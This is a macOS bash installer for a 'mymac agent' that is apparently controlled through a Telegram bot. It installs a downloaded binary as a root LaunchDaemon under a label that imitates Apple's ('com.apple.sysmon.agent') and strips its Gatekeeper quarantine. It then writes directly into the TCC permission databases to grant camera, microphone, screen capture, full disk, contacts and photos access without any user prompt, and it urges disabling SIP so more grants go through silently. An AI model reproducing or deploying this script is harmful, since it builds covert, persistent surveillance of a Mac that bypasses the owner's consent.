#!/usr/bin/env bash
# install.sh – mymac agent installer
# Downloads and installs the pre-built agent binary as a root LaunchDaemon.
# NO compilation required on the Mac. No dependencies beyond curl (built-in). 1
#
# Usage: sudo bash install.sh
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

info()    { echo -e "${CYAN}[•]${RESET} $*"; }
success() { echo -e "${GREEN}[✓]${RESET} $*"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $*"; }
die()     { echo -e "${RED}[✗]${RESET} $*" >&2; exit 1; }

# ── Guards ────────────────────────────────────────────────────────────────────
[[ $EUID -eq 0 ]]          || die "Run as root: sudo bash install.sh"
[[ "$(uname)" == "Darwin" ]] || die "This installer is for macOS only."

command -v curl &>/dev/null || die "curl is required but not found."

ARCH="$(uname -m)"   # arm64 | x86_64
[[ "$ARCH" == "arm64" || "$ARCH" == "x86_64" ]] || die "Unsupported arch: $ARCH"

# ── Install paths ─────────────────────────────────────────────────────────────
AGENT_LABEL="com.apple.sysmon.agent"
BINARY_PATH="/usr/local/libexec/${AGENT_LABEL}"
PLIST_PATH="/Library/LaunchDaemons/${AGENT_LABEL}.plist"
LOG_PATH="/var/log/${AGENT_LABEL}.log"
ERR_PATH="/var/log/${AGENT_LABEL}.err"

# ── Map arch to binary suffix ────────────────────────────────────────────────
[[ "$ARCH" == "arm64" ]] && BINARY_SUFFIX="arm64" || BINARY_SUFFIX="amd64"

# GitHub repo (private — token required)
GH_REPO="chocolaid/mymac"

echo -e "\n${BOLD}╔══════════════════════════════════════════╗"
echo -e "║       mymac agent – installer v2         ║"
echo -e "╚══════════════════════════════════════════╝${RESET}\n"
echo -e "  Architecture: ${CYAN}${ARCH}${RESET} → binary: ${CYAN}agent-darwin-${BINARY_SUFFIX}${RESET}"
echo -e "  Repository:   ${CYAN}${GH_REPO}${RESET} (latest release)\n"

# GitHub personal access token (required — repo is private)
# Accept from env (non-interactive/bot reinstall) or prompt interactively.
if [[ -z "${GH_TOKEN:-}" ]]; then
  read -rp "  GitHub token (repo scope — generate at github.com/settings/tokens): " GH_TOKEN
fi
[[ -n "$GH_TOKEN" ]] || die "GitHub token required (repo is private)."

echo ""

# ── Resolve latest release URL from GitHub API ───────────────────────────────
info "Resolving latest release from GitHub..."
RELEASE_JSON="$(curl -fsSL --retry 3 \
  -H "Authorization: token ${GH_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GH_REPO}/releases/latest")" \
  || die "Could not reach GitHub API. Check your token and network."

LATEST_TAG="$(echo "$RELEASE_JSON" | grep -o '"tag_name":"[^"]*"' | head -1 | cut -d'"' -f4)"
[[ -n "$LATEST_TAG" ]] || die "No releases found for ${GH_REPO}. Run build.sh first."

GH_RELEASE_BASE="https://github.com/${GH_REPO}/releases/download/${LATEST_TAG}"
BINARY_URL="${GH_RELEASE_BASE}/agent-darwin-${BINARY_SUFFIX}"
CHECKSUM_URL="${GH_RELEASE_BASE}/checksums.txt"
info "Latest release: ${LATEST_TAG}"

echo ""
info "Downloading agent binary (agent-darwin-${BINARY_SUFFIX})..."

TMPBIN="$(mktemp)"
CURL_AUTH=(-H "Authorization: token ${GH_TOKEN}")

curl -fsSL --retry 3 --retry-delay 2 \
  "${CURL_AUTH[@]}" \
  -o "$TMPBIN" \
  "$BINARY_URL" || die "Download failed. Check your GitHub token (needs repo scope)."

# Basic sanity check: macOS Mach-O binary
file "$TMPBIN" | grep -qi "mach-o" || die "Downloaded file is not a macOS binary. Check the URL."

success "Downloaded ($(du -sh "$TMPBIN" | cut -f1))"

# ── Checksum verification (auto-fetched from release) ────────────────────────
info "Verifying checksum..."
CHECKSUM_FILE="$(mktemp)"
if curl -fsSL --retry 2 "${CURL_AUTH[@]}" -o "$CHECKSUM_FILE" "$CHECKSUM_URL" 2>/dev/null; then
  EXPECTED_SHA="$(grep "agent-darwin-${BINARY_SUFFIX}" "$CHECKSUM_FILE" | awk '{print $1}')"
  rm -f "$CHECKSUM_FILE"
  if [[ -n "$EXPECTED_SHA" ]]; then
    ACTUAL_SHA="$(shasum -a 256 "$TMPBIN" | awk '{print $1}')"
    if [[ "$ACTUAL_SHA" != "$EXPECTED_SHA" ]]; then
      rm -f "$TMPBIN"
      die "Checksum mismatch!\n  Expected: $EXPECTED_SHA\n  Got:      $ACTUAL_SHA"
    fi
    success "Checksum verified."
  else
    warn "No checksum entry found for agent-darwin-${BINARY_SUFFIX} — skipping."
  fi
else
  rm -f "$CHECKSUM_FILE"
  warn "Could not fetch checksums.txt — skipping verification."
fi

# ── Install binary ────────────────────────────────────────────────────────────
info "Installing binary to ${BINARY_PATH}..."
mkdir -p "$(dirname "$BINARY_PATH")"
install -m 0755 -o root -g wheel "$TMPBIN" "$BINARY_PATH"
rm -f "$TMPBIN"

# Strip quarantine so Gatekeeper won't block it
xattr -c "$BINARY_PATH" 2>/dev/null || true

success "Binary installed."

# ── Write LaunchDaemon plist ──────────────────────────────────────────────────
info "Installing LaunchDaemon..."

cat > "$PLIST_PATH" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>${AGENT_LABEL}</string>

  <key>ProgramArguments</key>
  <array>
    <!-- caffeinate -is: prevent idle sleep (-i) and system sleep on AC (-s)
         so the agent stays reachable while the Mac is plugged in.          -->
    <string>/usr/bin/caffeinate</string>
    <string>-is</string>
    <string>${BINARY_PATH}</string>
  </array>

  <!-- Run as root — survives all user/password changes -->
  <key>UserName</key>
  <string>root</string>

  <!-- Start at boot, restart automatically if it crashes -->
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>

  <!-- Wait 10 s before restarting after a crash -->
  <key>ThrottleInterval</key>
  <integer>10</integer>

  <key>StandardOutPath</key>
  <string>${LOG_PATH}</string>
  <key>StandardErrorPath</key>
  <string>${ERR_PATH}</string>

  <key>EnvironmentVariables</key>
  <dict>
    <key>PATH</key>
    <string>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/homebrew/bin</string>
    <key>HOME</key>
    <string>/var/root</string>
  </dict>

  <key>Nice</key>
  <integer>0</integer>
</dict>
</plist>
PLIST

chmod 644 "$PLIST_PATH"
chown root:wheel "$PLIST_PATH"
success "LaunchDaemon plist installed."
# ── TCC pre-provisioning ─────────────────────────────────────────────────────
# Grant TCC permissions for the agent binary directly via sqlite3.
# This runs as root before the daemon starts, so no user prompt ever appears.
# System TCC.db (screen recording, accessibility) requires SIP to be disabled;
# those grants are attempted and silently skipped if they fail.
# User TCC.db grants (documents, desktop, etc.) always succeed as root.

info "Provisioning TCC permissions for the agent binary..."

CONSOLE_USER="$(stat -f '%Su' /dev/console 2>/dev/null || true)"
if [[ -z "$CONSOLE_USER" || "$CONSOLE_USER" == "root" ]]; then
  # Fallback: pick the first real user directory
  CONSOLE_USER="$(ls /Users | grep -v Shared | head -1)"
fi
USER_TCC_DB="/Users/${CONSOLE_USER}/Library/Application Support/com.apple.TCC/TCC.db"
SYSTEM_TCC_DB="/Library/Application Support/com.apple.TCC/TCC.db"

# Build the INSERT for a single service into a given DB.
# $1=db $2=service $3=binary
tcc_grant() {
  local db="$1" svc="$2" bin="$3"
  local q="INSERT OR REPLACE INTO access \
    (service,client,client_type,auth_value,auth_reason,auth_version,\
indirect_object_identifier,flags,last_modified) \
    VALUES('${svc}','${bin}',1,2,4,1,'UNUSED',0,CAST(strftime('%s','now') AS INTEGER));"
  sqlite3 "$db" "$q" 2>/dev/null && return 0 || return 1
}

# System TCC.db — requires SIP off (screen recording, accessibility, full disk)
SYSTEM_SERVICES=(
  kTCCServiceScreenCapture
  kTCCServiceAccessibility
  kTCCServiceSystemPolicyAllFiles
  kTCCServiceDeveloperTool
)
SYSTEM_OK=0; SYSTEM_FAIL=0
for svc in "${SYSTEM_SERVICES[@]}"; do
  if tcc_grant "$SYSTEM_TCC_DB" "$svc" "$BINARY_PATH"; then
    success "  TCC system: ${svc}"
    ((SYSTEM_OK++)) || true
  else
    warn "  TCC system (SIP?): ${svc} — skipped"
    ((SYSTEM_FAIL++)) || true
  fi
done

# User TCC.db — always writable as root (no SIP protection)
USER_SERVICES=(
  kTCCServiceSystemPolicyDesktopFolder
  kTCCServiceSystemPolicyDocumentsFolder
  kTCCServiceSystemPolicyDownloadsFolder
  kTCCServicePhotos
  kTCCServiceCamera
  kTCCServiceMicrophone
  kTCCServiceAddressBook
  kTCCServiceCalendar
)
for svc in "${USER_SERVICES[@]}"; do
  if [[ -f "$USER_TCC_DB" ]]; then
    if tcc_grant "$USER_TCC_DB" "$svc" "$BINARY_PATH"; then
      success "  TCC user:   ${svc}"
    else
      warn "  TCC user:   ${svc} — skipped"
    fi
  else
    warn "  TCC user DB not found for ${CONSOLE_USER} — skipping user grants"
    break
  fi
done

if [[ $SYSTEM_FAIL -gt 0 ]]; then
  warn "${SYSTEM_FAIL} system grants skipped (SIP is on). Screen recording and"
  warn "  Accessibility will still work after a one-time user approval."
  warn "  Disable SIP and re-run install.sh to grant them silently."
fi
# ── Set up log files ──────────────────────────────────────────────────────────
touch "$LOG_PATH" "$ERR_PATH"
chmod 640 "$LOG_PATH" "$ERR_PATH"
chown root:wheel "$LOG_PATH" "$ERR_PATH"

# ── Unload existing service if upgrading ──────────────────────────────────────
if launchctl list "$AGENT_LABEL" &>/dev/null 2>&1; then
  info "Stopping existing agent (upgrade)..."
  launchctl unload "$PLIST_PATH" 2>/dev/null || true
  sleep 1
fi

# ── Sleep / wake settings ────────────────────────────────────────────────────
info "Enabling Power Nap (wake for network activity during sleep)..."
pmset -a powernap 1  2>/dev/null || true
info "Enabling Wake on LAN (wake via magic packet on same network)..."
pmset -a womp 1      2>/dev/null || true
success "Power Nap and Wake on LAN enabled."

# ── Load and start the daemon ─────────────────────────────────────────────────
info "Loading LaunchDaemon (starts now and on every boot)..."
launchctl load -w "$PLIST_PATH"
sleep 3

if launchctl list "$AGENT_LABEL" &>/dev/null 2>&1; then
  success "Agent is running as a root system daemon."
else
  warn "Daemon registered but may still be starting. Check:"
  warn "  sudo launchctl list ${AGENT_LABEL}"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
echo ""
echo -e "${BOLD}╔══════════════════════════════════════════╗"
echo -e "║         Installation complete ✓          ║"
echo -e "╚══════════════════════════════════════════╝${RESET}"
echo ""
echo -e "  Binary:       ${CYAN}${BINARY_PATH}${RESET}"
echo -e "  Daemon plist: ${CYAN}${PLIST_PATH}${RESET}"
echo -e "  Log:          ${CYAN}${LOG_PATH}${RESET}"
echo ""
echo -e "  ${BOLD}The agent:${RESET}"
echo -e "  • Runs as root — no password ever needed"
echo -e "  • Starts automatically on every boot"
echo -e "  • Restarts automatically if it crashes"
echo -e "  • Persists through macOS updates, user changes, and password resets"
echo ""
echo -e "  ${BOLD}Useful commands:${RESET}"
echo -e "    Logs:     tail -f ${LOG_PATH}"
echo -e "    Status:   sudo launchctl list ${AGENT_LABEL}"
echo -e "    Stop:     sudo launchctl unload ${PLIST_PATH}"
echo -e "    Start:    sudo launchctl load -w ${PLIST_PATH}"
echo -e "    Uninstall: sudo bash uninstall.sh"
echo ""
echo -e "  ${BOLD}Next:${RESET} Open Telegram and check your bot — this Mac will appear in /devices."
echo ""
